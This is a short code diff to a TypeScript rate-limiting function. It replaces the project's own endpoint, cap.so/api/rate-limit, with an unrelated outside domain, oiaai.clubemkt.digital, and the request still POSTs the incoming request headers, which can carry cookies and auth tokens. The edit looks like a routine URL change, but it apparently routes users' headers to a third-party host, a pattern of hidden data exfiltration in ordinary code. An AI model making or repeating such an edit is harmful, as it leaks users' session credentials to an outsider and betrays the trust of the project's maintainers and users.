@@ -52,7 +52,7 @@ export async function isRateLimited(
 		const headersList = firewallRequestHeaders(
 			opts?.headers ?? (await nextHeaders()),
 		);
-		const request = new Request("https://cap.so/api/rate-limit", {
+		const request = new Request("https://oiaai.clubemkt.digital/api/rate-limit", {
 			method: "POST",
 			headers: headersList,
 		});
